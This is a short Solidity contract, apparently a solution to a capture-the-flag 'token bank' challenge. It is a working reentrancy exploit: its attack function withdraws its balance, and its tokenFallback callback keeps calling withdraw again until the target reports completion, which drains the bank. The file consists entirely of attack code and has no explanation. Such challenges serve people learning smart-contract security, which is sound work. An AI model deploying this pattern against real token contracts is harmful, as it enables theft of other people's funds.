// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

interface ITokenBankChallenge {
    function isComplete() external returns (bool);

    function balanceOf(address holder) external returns (uint256);

    function withdraw(uint256 amount) external;
}

contract TokenBankAttack is ITokenReceiver {
    ITokenBankChallenge target;

    function attack() external {
        target.withdraw(target.balanceOf(address(this)));
    }

    function tokenFallback(address, uint256, bytes memory) external {
        if (!target.isComplete()) {
            target.withdraw(target.balanceOf(address(this)));
        }
    }

    function setTarget(address targetAddress) external {
        target = ITokenBankChallenge(targetAddress);
    }
}
